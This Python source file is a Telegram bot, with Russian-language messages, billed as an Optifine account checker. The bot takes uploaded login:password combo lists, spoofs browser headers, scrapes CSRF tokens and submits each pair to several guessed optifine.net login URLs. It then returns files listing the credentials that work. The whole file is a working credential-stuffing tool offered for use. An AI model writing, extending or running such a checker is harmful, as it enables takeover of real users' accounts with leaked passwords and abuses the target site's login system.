import os
import logging
import asyncio
import aiofiles
import time
import random
from datetime import datetime
from typing import Dict, List, Tuple
import requests
from bs4 import BeautifulSoup

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net"""
    
    def __init__(self):
        self.session = requests.Session()
        # Максимально приближаемся к реальному браузеру
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })
    
    async def debug_request(self, url: str, method: str = 'GET', **kwargs):
        """Отладка запросов"""
        try:
            logger.info(f"🌐 {method} {url}")
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=30, **kwargs)
            else:
                response = self.session.post(url, timeout=30, **kwargs)
            
            logger.info(f"📊 Статус: {response.status_code}")
            logger.info(f"📍 URL после редиректа: {response.url}")
            logger.info(f"📦 Размер ответа: {len(response.content)} байт")
            logger.info(f"🍪 Куки: {dict(self.session.cookies)}")
            
            return response
        except Exception as e:
            logger.error(f"❌ Ошибка запроса: {e}")
            return None
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка одного аккаунта"""
        
        logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
        
        try:
            # МЕТОД 1: Прямая проверка через логин (если это ник)
            if len(login) < 20 and all(c.isalnum() or c == '_' for c in login):
                # Проверяем страницу профиля
                profile_url = f"https://optifine.net/profile/{login}"
                response = await self.debug_request(profile_url)
                
                if response and response.status_code == 200:
                    if 'not found' not in response.text.lower():
                        logger.info(f"✅ Найден профиль: {login}")
                        return {
                            'login': login,
                            'password': password,
                            'status': 'valid',
                            'method': 'profile_check'
                        }
            
            # МЕТОД 2: Проверка через страницу входа
            # Сначала получаем главную страницу
            await self.debug_request('https://optifine.net')
            time.sleep(1)
            
            # Получаем страницу входа
            login_page = await self.debug_request('https://optifine.net/login')
            
            if not login_page:
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Не удалось загрузить страницу входа'
                }
            
            # Парсим страницу для поиска формы
            soup = BeautifulSoup(login_page.text, 'html.parser')
            
            # Сохраняем HTML для отладки
            with open(f"debug_login_{login[:10]}.html", 'w', encoding='utf-8') as f:
                f.write(login_page.text)
            logger.info(f"💾 HTML сохранен в debug_login_{login[:10]}.html")
            
            # Ищем все формы
            forms = soup.find_all('form')
            logger.info(f"📝 Найдено форм: {len(forms)}")
            
            for i, form in enumerate(forms):
                logger.info(f"Форма {i}: action={form.get('action')}, method={form.get('method')}")
                
                # Ищем поля ввода
                inputs = form.find_all('input')
                for inp in inputs:
                    logger.info(f"  Input: type={inp.get('type')}, name={inp.get('name')}, id={inp.get('id')}")
            
            # Пробуем найти CSRF токен
            csrf_token = None
            for meta in soup.find_all('meta'):
                if 'csrf' in str(meta).lower() or 'token' in str(meta).lower():
                    csrf_token = meta.get('content')
                    logger.info(f"🔑 Найден CSRF токен в meta: {csrf_token}")
            
            for inp in soup.find_all('input', type='hidden'):
                if 'csrf' in inp.get('name', '').lower() or 'token' in inp.get('name', '').lower():
                    csrf_token = inp.get('value')
                    logger.info(f"🔑 Найден CSRF токен в input: {csrf_token}")
            
            # Формируем данные для входа
            login_data = {}
            
            # Пробуем разные варианты полей
            if csrf_token:
                login_data['csrf_token'] = csrf_token
                login_data['_token'] = csrf_token
            
            login_data['username'] = login
            login_data['email'] = login
            login_data['login'] = login
            login_data['password'] = password
            login_data['submit'] = 'Login'
            login_data['commit'] = 'Sign in'
            
            # Пробуем разные URL для отправки формы
            login_urls = [
                'https://optifine.net/login',
                'https://optifine.net/login.php',
                'https://optifine.net/auth/login',
                'https://optifine.net/authenticate',
                'https://optifine.net/session',
                'https://optifine.net/account/login'
            ]
            
            for login_url in login_urls:
                logger.info(f"📤 Пробую отправить на {login_url}")
                
                # Пробуем разные методы отправки
                for data_variant in [login_data, {'email': login, 'password': password}, {'username': login, 'password': password}]:
                    try:
                        response = self.session.post(
                            login_url, 
                            data=data_variant,
                            allow_redirects=True,
                            timeout=30
                        )
                        
                        logger.info(f"📊 Статус: {response.status_code}")
                        logger.info(f"📍 URL после редиректа: {response.url}")
                        
                        # Проверяем результат
                        if response.status_code == 200:
                            # Критерии успеха
                            success_texts = [
                                'dashboard',
                                'profile',
                                'account',
                                'welcome',
                                'logout',
                                'log out',
                                'successfully logged in'
                            ]
                            
                            if any(text in response.text.lower() for text in success_texts):
                                logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                                return {
                                    'login': login,
                                    'password': password,
                                    'status': 'valid',
                                    'method': 'login_success'
                                }
                            
                            # Критерии ошибки
                            error_texts = [
                                'invalid',
                                'incorrect',
                                'wrong',
                                'error',
                                'failed',
                                'not found'
                            ]
                            
                            if any(text in response.text.lower() for text in error_texts):
                                logger.info(f"❌ Неверный: {login[:20]}")
                                return {
                                    'login': login,
                                    'status': 'invalid',
                                    'error': 'Неверный логин/пароль'
                                }
                    
                    except Exception as e:
                        logger.error(f"Ошибка при POST {login_url}: {e}")
                        continue
            
            # Если ничего не нашли
            logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
            return {
                'login': login,
                'status': 'invalid',
                'error': 'Не удалось определить'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }

# Создаем экземпляр
checker = OptifineChecker()

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    results = {
        'valid': [],
        'invalid': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю проверку Optifine.net...**\n"
        "⏳ Пожалуйста, подождите"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        start_time = time.time()
        
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            # Проверка аккаунта
            result = await checker.check_account(login, password)
            
            # Сортируем результаты
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"⚠️ ОШИБКА: {login[:20]} - {result.get('error')}")
            
            bot_stats['total'] += 1
            
            # Задержка между запросами
            await asyncio.sleep(2)
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с рабочими
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Файл с нерабочими
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        # Файл с ошибками
        if results['errors']:
            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
                for acc in results['errors']:
                    await f.write(f"{acc['login']}:{acc['password']} | {acc.get('error', 'unknown')}\n")
            
            with open(error_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=error_file,
                    caption=f"⚠️ **Ошибок: {len(results['errors'])}**"
                )
            os.remove(error_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Account Checker**\n\n"
        f"🔍 Проверяет аккаунты на optifine.net\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
        f"📥 **Отправь .txt файл** с логинами и паролями\n"
        f"Формат: логин:пароль (каждый с новой строки)\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@mail.com:password123`\n"
            "`player123:qwerty456`\n\n"
            "⚡️ **Результат:**\n"
            "• ✅ рабочие аккаунты\n"
            "• ❌ нерабочие аккаунты\n"
            "• ⚠️ ошибки проверки"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ**")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        pass  # Нет Chrome для закрытия

if __name__ == '__main__':
    main()